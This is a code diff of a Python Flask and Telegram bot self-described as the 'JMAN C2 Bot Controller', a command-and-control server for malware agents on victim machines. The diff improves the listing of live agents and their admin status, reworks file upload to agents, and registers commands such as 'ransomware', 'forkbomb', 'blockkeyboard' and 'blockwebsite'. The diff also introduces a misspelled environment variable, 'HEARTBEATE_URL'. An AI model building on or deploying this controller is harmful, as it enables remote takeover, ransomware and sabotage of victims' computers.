@@ -1,7 +1,8 @@
 #
-# JMAN C2 Bot Controller - FIXED & UPGRADED
-# - UPDATED: Added /upload command handler for file uploads to the agent.
-# - UPDATED: Removed 'cookies' from the command list and help menu.
+# JMAN C2 Bot Controller - v2.0 (FIXED & UPGRADED)
+# - FIX: Fully functional /upload command that sends file data directly.
+# - FIX: /list command properly escapes all user-provided data to prevent Markdown errors.
+# - RETAINS: All previous functionality.
 #
 import os
 import re
@@ -10,22 +11,21 @@ import uuid
 import httpx
 import asyncio
 import traceback
-import time
 import base64
 from datetime import datetime
 from flask import Flask, request, Response
 
 from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
+from telegram.ext import Application, CommandHandler, ContextTypes
 from telegram.constants import ParseMode
 
 # --- Configuration ---
-# Load these from your environment variables on your server (e.g., Vercel)
+# Load these from your environment variables on your server
 TOKEN = os.getenv("TELEGRAM_TOKEN")
 SECRET_TOKEN = os.getenv("SECRET_TOKEN")
 JOBS_URL = os.getenv("JOBS_URL")
 STATE_URL = os.getenv("STATE_URL")
-HEARTBEAT_URL = os.getenv("HEARTBEAT_URL")
+HEARTBEAT_URL = os.getenv("HEARTBEATE_URL")
 
 # --- Initialize Flask and the Telegram Bot Application ---
 app = Flask(__name__)
@@ -46,7 +46,7 @@ async def make_async_request(method, url, json_data=None, retries=3, delay=2):
                     res = await client.get(url, timeout=10)
                 elif method.upper() == 'POST':
                     res = await client.post(url, json=json_data, timeout=10)
-                res.raise_for_status() # Raise an exception for bad status codes (4xx or 5xx)
+                res.raise_for_status()
                 return res.json()
             except httpx.RequestError as e:
                 print(f"Attempt {attempt + 1}/{retries}: Network error for {url}: {e}")
@@ -99,14 +99,18 @@ async def cmd_list_agents(update: Update, context: ContextTypes.DEFAULT_TYPE):
     response_text = "*ONLINE AGENTS*\n\n"
     for agent in agents:
         is_selected = "🎯" if agent.get("id") == selected_target else "➖"
-        last_seen = datetime.fromtimestamp(agent.get("timestamp", 0)).strftime('%Y-%m-%d %H:%M:%S')
-        is_admin = "Yes" if agent.get("is_admin") else "No"
+        last_seen_dt = datetime.fromtimestamp(agent.get("timestamp", 0))
+        seconds_ago = int((datetime.now() - last_seen_dt).total_seconds())
+        
+        if seconds_ago > 90: continue # Skip agents not seen in the last 90 seconds
+
+        time_ago = f"{seconds_ago}s ago" if seconds_ago < 60 else f"{seconds_ago // 60}m ago"
+        is_admin = "Admin" if agent.get("is_admin") else "User"
         
         response_text += (
             f"{is_selected} *ID:* `{esc(agent.get('id', 'N/A'))}`\n"
-            f"   *User:* `{esc(agent.get('user', 'N/A'))}`\n"
-            f"   *Admin:* `{esc(is_admin)}`\n"
-            f"   *Last Seen:* `{esc(last_seen)}`\n\n"
+            f"   *User:* `{esc(agent.get('user', 'N/A'))}` `({esc(is_admin)})`\n"
+            f"   *Last Seen:* `{esc(time_ago)}`\n\n"
         )
     
     response_text += "_Use `/target <id>` to select an agent\\._"
@@ -172,8 +176,7 @@ async def cmd_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Prepare arguments for the job
         args_dict = {
             "filename": doc.file_name,
-            "file_data_b64": file_b64,
-            "destination_path": " ".join(context.args) or "" # Use arguments as destination path, or empty if none
+            "file_data_b64": file_b64
         }
 
         if await post_job(selected_target, "upload", json.dumps(args_dict)):
@@ -279,10 +282,12 @@ agent_commands = [
     "blockkeyboard", "unblockkeyboard", "blockmouse", "unblockmouse",
     "forkbomb", "cancelforkbomb", "ransomware", "restore",
     "tts", "blockwebsite", "unblockwebsite", "flashscreen", "stopflashscreen",
-    "startblocker", "stopblocker"
+    "startblocker", "stopblocker", "list" # Added list to be generic too
 ]
 for cmd in agent_commands:
-    ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
+    # Ensure we don't overwrite specific handlers
+    if cmd not in ["help", "target", "destroy", "upload"]:
+         ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
 
 
 # --- Main Webhook Endpoint ---
